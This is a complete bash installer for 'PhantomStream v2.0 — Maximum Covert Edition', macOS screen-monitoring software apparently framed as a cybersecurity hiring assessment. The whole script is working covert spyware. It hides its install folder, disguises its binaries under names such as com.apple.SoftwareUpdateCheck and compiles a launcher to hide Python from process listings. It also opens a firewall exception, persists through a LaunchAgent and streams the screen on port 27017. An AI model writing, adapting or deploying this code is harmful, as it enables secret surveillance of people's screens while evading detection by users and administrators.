#!/usr/bin/env bash
# install.sh — PhantomStream v2.0 installer
# Phase 2: Maximum Covert Edition
# Process: com.institute.backgroundsyncd | Port: 27017 | LaunchAgent: com.institute.backgroundsyncd

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
ok()   { echo -e "${GREEN}[OK]${RESET}    $*"; }
info() { echo -e "${CYAN}[INFO]${RESET}  $*"; }
warn() { echo -e "${YELLOW}[WARN]${RESET}  $*"; }
die()  { echo -e "${RED}[ERROR]${RESET} $*" >&2; exit 1; }

INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
DAEMON_NAME="com.institute.backgroundsyncd"
DAEMON_BIN="$INSTALL_DIR/$DAEMON_NAME"
FFMPEG_BIN="$INSTALL_DIR/com.institute.helperd"
PLIST_NAME="com.institute.backgroundsyncd.plist"
PLIST_DST="$HOME/Library/LaunchAgents/$PLIST_NAME"
STREAM_PORT=27017
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXISTING_FFMPEG="$HOME/Library/ProctorTest/ffmpeg"

echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║   PhantomStream v2.0 — Maximum Covert Edition        ║"
echo "║   Institute Cybersecurity Hiring Assessment           ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# ── Create hidden install directory ──────────────────────────────────────────
info "Creating install dir: $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"
chflags hidden "$INSTALL_DIR" 2>/dev/null || true
ok "Directory ready"

# ── Copy ffmpeg binary (kept as fallback / detection artifact) ────────────────
if [[ -x "$EXISTING_FFMPEG" ]]; then
    info "Copying ffmpeg from ProctorTest …"
    cp "$EXISTING_FFMPEG" "$FFMPEG_BIN"
    chmod +x "$FFMPEG_BIN"
    xattr -c "$FFMPEG_BIN" 2>/dev/null || true
    ok "ffmpeg binary installed as com.institute.helperd"
elif [[ ! -x "$FFMPEG_BIN" ]]; then
    warn "ffmpeg not found — skipping (not required for Phase 2)"
fi

# ── Install main daemon (server.py → com.institute.backgroundsyncd) ──────────
info "Installing daemon: $DAEMON_NAME"
cp "$SCRIPT_DIR/server.py" "$DAEMON_BIN"
chmod +x "$DAEMON_BIN"
ok "Daemon installed: $DAEMON_BIN"

# ── Compile stealth launcher binary ──────────────────────────────────────────
LAUNCHER_SRC="$SCRIPT_DIR/launcher.c"
LAUNCHER_BIN="$INSTALL_DIR/com.apple.SoftwareUpdateCheck"

if [[ -f "$LAUNCHER_SRC" ]]; then
    info "Compiling stealth launcher (hides Python from ps aux)..."
    COMPILE_OK=0

    # Derive Python include/lib paths via sysconfig (works Homebrew + Xcode CLT)
    PY_INC=$(python3 -c "import sysconfig; print(sysconfig.get_path('include'))" 2>/dev/null)
    PY_LIB=$(python3 -c "import sysconfig; print(sysconfig.get_config_var('LIBDIR'))" 2>/dev/null)
    PY_VER=$(python3 -c "import sysconfig; \
        print(sysconfig.get_config_var('LDVERSION') or \
              sysconfig.get_config_var('VERSION'))" 2>/dev/null)

    if [[ -n "$PY_INC" ]] && [[ -n "$PY_LIB" ]] && [[ -n "$PY_VER" ]]; then
        if cc -I"$PY_INC" -L"$PY_LIB" -lpython"$PY_VER" \
               -Wl,-rpath,"$PY_LIB" \
               -o "$LAUNCHER_BIN" "$LAUNCHER_SRC" 2>/dev/null; then
            COMPILE_OK=1
        fi
    fi

    # Fallback: try python3-config
    if [[ $COMPILE_OK -eq 0 ]] && command -v python3-config >/dev/null 2>&1; then
        PY_CFLAGS=$(python3-config --cflags 2>/dev/null)
        PY_LDFLAGS=$(python3-config --ldflags --embed 2>/dev/null || \
                     python3-config --ldflags 2>/dev/null)
        if cc $PY_CFLAGS $PY_LDFLAGS \
               -o "$LAUNCHER_BIN" "$LAUNCHER_SRC" 2>/dev/null; then
            COMPILE_OK=1
        fi
    fi

    if [[ $COMPILE_OK -eq 1 ]]; then
        chmod +x "$LAUNCHER_BIN"
        xattr -c "$LAUNCHER_BIN" 2>/dev/null || true
        ok "Stealth launcher compiled: com.apple.SoftwareUpdateCheck"
    else
        warn "Stealth compile failed — ps aux will show python3 (degraded stealth)"
    fi
else
    warn "launcher.c not found — stealth binary skipped"
fi

# ── Install support scripts ───────────────────────────────────────────────────
for f in wrapper.sh start-monitor.sh status.sh uninstall.sh; do
    [[ -f "$SCRIPT_DIR/$f" ]] && cp "$SCRIPT_DIR/$f" "$INSTALL_DIR/$f" && \
        chmod +x "$INSTALL_DIR/$f" && ok "Installed: $f" || warn "Missing: $f"
done

# ── Install LaunchAgent plist ─────────────────────────────────────────────────
mkdir -p "$HOME/Library/LaunchAgents"
if [[ -f "$SCRIPT_DIR/$PLIST_NAME" ]]; then
    sed "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" \
        "$SCRIPT_DIR/$PLIST_NAME" > "$PLIST_DST"
    ok "LaunchAgent installed: $PLIST_DST"
else
    warn "Plist not found — LaunchAgent not installed"
fi

# ── Remove old Phase 1 LaunchAgent if present ────────────────────────────────
OLD_PLIST="$HOME/Library/LaunchAgents/com.institute.syshelper.local.plist"
if [[ -f "$OLD_PLIST" ]]; then
    launchctl unload "$OLD_PLIST" 2>/dev/null || true
    rm -f "$OLD_PLIST"
    ok "Removed old Phase 1 LaunchAgent"
fi

# ── Firewall: allow python3 through ──────────────────────────────────────────
/usr/libexec/ApplicationFirewall/socketfilterfw \
    --add /usr/bin/python3 >/dev/null 2>&1 || true
/usr/libexec/ApplicationFirewall/socketfilterfw \
    --unblockapp /usr/bin/python3 >/dev/null 2>&1 || true
ok "Firewall exception added for python3"

# ── Detect LAN IP ─────────────────────────────────────────────────────────────
LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || \
         ipconfig getifaddr en1 2>/dev/null || \
         ifconfig | awk '/inet / && !/127\.0\.0/ {print $2; exit}' || \
         echo "UNKNOWN")

# ── Check Screen Recording permission ────────────────────────────────────────
info "Checking Screen Recording permission …"
SC_TEST=$(screencapture -x -t jpg /tmp/.sc_test.jpg 2>&1; echo $?)
rm -f /tmp/.sc_test.jpg
if [[ "$SC_TEST" == "0" ]]; then
    ok "Screen Recording granted"
else
    warn "Screen Recording NOT granted — grant in System Prefs → Privacy → Screen Recording"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
echo
echo -e "${BOLD}${GREEN}══════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}  PhantomStream v2.0 — Installation complete${RESET}"
echo -e "${GREEN}══════════════════════════════════════════════════════${RESET}"
echo
echo -e "  Install dir:   ${CYAN}$INSTALL_DIR${RESET}"
echo -e "  Daemon:        ${CYAN}$DAEMON_NAME${RESET}"
echo -e "  LaunchAgent:   ${CYAN}$PLIST_DST${RESET}"
echo -e "  Stream port:   ${CYAN}$STREAM_PORT${RESET}"
echo -e "  Stream URL:    ${CYAN}http://${LAN_IP}:${STREAM_PORT}/${RESET}"
echo
echo -e "  ${BOLD}Start now:${RESET}"
echo -e "    ${CYAN}$INSTALL_DIR/start-monitor.sh${RESET}"
echo
echo -e "  ${BOLD}Start on login:${RESET}"
echo -e "    ${CYAN}launchctl load $PLIST_DST${RESET}"
echo
